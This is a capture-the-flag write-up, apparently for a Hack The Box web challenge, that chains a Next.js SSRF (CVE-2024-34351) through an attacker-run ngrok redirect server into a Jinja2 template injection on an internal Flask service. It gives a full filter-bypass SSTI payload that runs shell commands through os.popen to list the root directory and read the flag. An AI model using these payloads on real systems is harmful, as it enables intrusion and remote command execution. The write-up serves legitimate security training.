---
layout: page
description: "SSRF - SSTI"
title: "[WEB] HTB Challange - Doxit"
---
# Doxit

This is a web challenge based on 2 services, one exposed and one running in local.
the exposed one is a Node js app, the other one is a flask app that simulate an AV.

this is the content of the challenge:
```
challenge
  | - av
  |  | - application
  |  |  | - __pycache__
  |  |  | - util
  |  |  |  | - __pycache__
  |  |  | - static
  |  |  |  | - css
  |  |  |  | - images
  |  |  | - blueprints
  |  |  |  | - __pycache__
  |  |  | - templates
  |  |  |  | - layouts
  | - front-end
  |  | - public
  |  | - app
  |  |  | - hof
  |  |  | - error
```

So front-end is the NodeJs app and av is the flask app.


Basically checking for the requirements we can see that it uses Next 14.1.0 that is vulnerable to SSRF [NextJS-SSRF](https://www.assetnote.io/resources/research/digging-for-ssrf-in-nextjs-apps) assigned to CVE-2024-34351.

Basically if you keep a real Next-Action ID, and you change the Host header you can redirect it to another web site.
This allows us to redirect the request to our malicius web page.

The idea now is to use this web server publish by ngrok to redirect to the local services our request.
```
from flask import Flask, Response, request, redirect

app = Flask('__name_')

@app.route('/')
def catch(path):
    if request.method == 'HEAD':
        resp = Response("")
        resp.headers ['Content-Type'] = 'text/x-component'
        return resp
    return redirect('http://0.0.0.0:3000/register?username=test&password=testtest')

    
app.run(host="0.0.0.0", port=8081, debug=False)
```
```
ngrok http 8081
```
And the post request should look like this:
```
POST / HTTP/1.1
Host: nutmeg-engaging-compacter.ngrok-free.dev
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:150.0) Gecko/20100101 Firefox/150.0
Next-Action: 0b0da34c9bad83debaebc8b90e4d5ec7544ca862 //IMPORTANT
Next-Router-State-Tree: %5B%22%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D
Connection: keep-alive
Priority: u=0

{}
```

in order to understand what to do after it can be good to run the av app in a local virtual environment in order to understand how it works.

Without going to deep the idea is that there is the parameter ?directory that is affected by template injection, and there is a filter that is the following:
```
invalid_chars = ["{{", "}}", ".", "_", "[", "]","\\", "x"]
```
so we should use some trick to inject a payload to cat the flag there.

the trick is to use print() to understand what to do and retrieve piece by piece all the words to build the injection

to do this, we should use the token that we get by the registration in this case: ced507500890ab628c7edf15fbe9df2f

```html
<pre><code class="language-python">
from flask import Flask, Response, request, redirect

app = Flask('__name_')

@app.route('/')
def catch(path):
    if request.method == 'HEAD':
        resp = Response("")
        resp.headers ['Content-Type'] = 'text/x-component'
        return resp
    return redirect("http://0.0.0.0:3000/home?token=ced507500890ab628c7edf15fbe9df2f&directory={%with%20a=((((request|attr('application'))|attr(request|attr('args')|attr('get')('globals')))|attr(request|attr('args')|attr('get')('getitem')))(request|attr('args')|attr('get')('builtins'))|attr(request|attr('args')|attr('get')('getitem')))(request|attr('args')|attr('get')('import'))('os')|attr('popen')(request|attr('args')|attr('get')('cmd'))|attr('read')()%}{%print(a)%}{%endwith%}&globals=__globals__&getitem=__getitem__&builtins=__builtins__&import=__import__&cmd=ls%20/")
    #return redirect("http://0.0.0.0:3000/home?token=ced507500890ab628c7edf15fbe9df2f&directory={%with%20a=((((request|attr('application'))|attr(request|attr('args')|attr('get')('globals')))|attr(request|attr('args')|attr('get')('getitem')))(request|attr('args')|attr('get')('builtins'))|attr(request|attr('args')|attr('get')('getitem')))(request|attr('args')|attr('get')('import'))('os')|attr('popen')(request|attr('args')|attr('get')('cmd'))|attr('read')()%}{%print(a)%}{%endwith%}&globals=__globals__&getitem=__getitem__&builtins=__builtins__&import=__import__&cmd=cat%20/flag960bbeb43c.txt")

    
app.run(host="0.0.0.0", port=8081, debug=False)
</code></pre>
```

So as you can see the payload is the following:
```html
<pre><code class="language-python">
List the files in / cause from the code flag.txt is modified like flag[random-chars].txt

directory={%with%20a=((((request|attr('application'))|attr(request|attr('args')|attr('get')('globals')))|attr(request|attr('args')|attr('get')('getitem')))(request|attr('args')|attr('get')('builtins'))|attr(request|attr('args')|attr('get')('getitem')))(request|attr('args')|attr('get')('import'))('os')|attr('popen')(request|attr('args')|attr('get')('cmd'))|attr('read')()%}{%print(a)%}{%endwith%}&globals=__globals__&getitem=__getitem__&builtins=__builtins__&import=__import__&cmd=ls%20/" 
{%endraw}

Cat flag

directory={%with%20a=((((request|attr('application'))|attr(request|attr('args')|attr('get')('globals')))|attr(request|attr('args')|attr('get')('getitem')))(request|attr('args')|attr('get')('builtins'))|attr(request|attr('args')|attr('get')('getitem')))(request|attr('args')|attr('get')('import'))('os')|attr('popen')(request|attr('args')|attr('get')('cmd'))|attr('read')()%}{%print(a)%}{%endwith%}&globals=__globals__&getitem=__getitem__&builtins=__builtins__&import=__import__&cmd=cat%20/flag960bbeb43c.txt
</code></pre>
```